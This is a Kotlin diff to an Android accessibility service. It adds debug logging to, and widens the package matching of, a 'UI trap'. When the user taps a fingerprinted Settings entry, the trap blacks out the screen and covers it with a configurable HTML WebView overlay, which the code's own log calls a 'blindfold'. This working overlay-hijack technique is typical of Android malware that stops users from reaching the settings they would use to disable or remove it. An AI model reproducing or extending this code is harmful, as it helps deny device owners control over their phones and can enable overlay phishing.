@@ -479,29 +479,35 @@ class MyAccessibilityService : AccessibilityService() {
                 val targetData = statsPrefs.getString("ui_trap_target", "") ?: ""
                 val pkg = event.packageName?.toString() ?: ""
                 
+                DebugLogger.log("UI_TRAP_VERBOSE", "Intercepted CLICK in package: [$pkg]. Expected target: [$targetData]")
+                
                 // FINGERPRINT MATCHING: Check Package + Hierarchy Content
-                if (targetData.isNotEmpty() && verifyStructuralMatch(event.source, pkg, targetData)) {
-                    val method = statsPrefs.getString("ui_trap_method", "ACC") ?: "ACC"
-                    val html = statsPrefs.getString("ui_trap_html", "") ?: ""
-                    val timeout = statsPrefs.getLong("ui_trap_timeout", 10L)
-                    
-                    DebugLogger.log("UI_TRAP", "Fingerprint matched in $pkg. Deploying blindfold.")
-                    
-                    // 1. Instant Blackout
-                    DimmerManager.applyDim(this, 100, method)
-                    
-                    // 2. Deploy WebView Overlay
-                    DynamicUIManager.showOverlay(this, true, method, html)
-                    
-                    // 3. Disarm Trap
-                    statsPrefs.edit().putBoolean("ui_trap_active", false).apply()
-                    
-                    // 4. Timeout Failsafe
-                    if (timeout > 0) {
-                        Handler(Looper.getMainLooper()).postDelayed({
-                            DynamicUIManager.removeOverlay(this)
-                            DimmerManager.applyDim(this, 0, method)
-                        }, timeout * 1000)
+                if (targetData.isNotEmpty()) {
+                    if (verifyStructuralMatch(event.source, pkg, targetData)) {
+                        val method = statsPrefs.getString("ui_trap_method", "ACC") ?: "ACC"
+                        val html = statsPrefs.getString("ui_trap_html", "") ?: ""
+                        val timeout = statsPrefs.getLong("ui_trap_timeout", 10L)
+                        
+                        DebugLogger.log("UI_TRAP", "Fingerprint matched in $pkg. Deploying blindfold.")
+                        
+                        // 1. Instant Blackout
+                        DimmerManager.applyDim(this, 100, method)
+                        
+                        // 2. Deploy WebView Overlay
+                        DynamicUIManager.showOverlay(this, true, method, html)
+                        
+                        // 3. Disarm Trap
+                        statsPrefs.edit().putBoolean("ui_trap_active", false).apply()
+                        
+                        // 4. Timeout Failsafe
+                        if (timeout > 0) {
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                DynamicUIManager.removeOverlay(this)
+                                DimmerManager.applyDim(this, 0, method)
+                            }, timeout * 1000)
+                        }
+                    } else {
+                        DebugLogger.log("UI_TRAP_VERBOSE", "Match failed for target[$targetData] in package [$pkg].")
                     }
                 }
             }
@@ -626,7 +632,14 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     private fun verifyStructuralMatch(node: AccessibilityNodeInfo?, pkg: String, target: String): Boolean {
-        if (node == null) return false
+        if (node == null) {
+            DebugLogger.log("UI_TRAP_REJECTED", "Clicked node is null.")
+            return false
+        }
+
+        // 0. Serialize the tree being analyzed for logs (Depth capped at 3 to prevent log spam overflow)
+        val treeSnapshot = serializeNode(node, 0, 3)?.toString() ?: "Empty"
+        DebugLogger.log("UI_TRAP_TREE", "Clicked Node Tree: $treeSnapshot")
 
         // 1. Split target into Title and Summary if user used the @@ separator
         // Format: "Title Text@@Summary Fragment"
@@ -634,12 +647,22 @@ class MyAccessibilityService : AccessibilityService() {
         val titleTarget = parts[0]
         val summaryTarget = parts.getOrNull(1)
 
-        // 2. Check Package Security (Only trigger in Settings for this specific trap)
-        if (!pkg.contains("com.android.settings")) return false
+        // 2. Check Package Security
+        if (!pkg.contains("settings", ignoreCase = true)) {
+            DebugLogger.log("UI_TRAP_REJECTED", "Package mismatch. Expected *settings*, got: $pkg")
+            return false
+        }
 
         // 3. Recursive check for Title and Summary inside the clicked container
         val hasTitle = findTextInside(node, titleTarget)
         val hasSummary = if (summaryTarget != null) findTextInside(node, summaryTarget) else true
+
+        if (!hasTitle) {
+            DebugLogger.log("UI_TRAP_REJECTED", "Title Target [$titleTarget] not found in the clicked node tree.")
+        }
+        if (summaryTarget != null && !hasSummary) {
+            DebugLogger.log("UI_TRAP_REJECTED", "Summary Target[$summaryTarget] not found in the clicked node tree.")
+        }
 
         if (hasTitle && hasSummary) {
             DebugLogger.log("TRAP_MATCH", "Fingerprint Verified: Title=[$titleTarget] Summary=[$summaryTarget]")
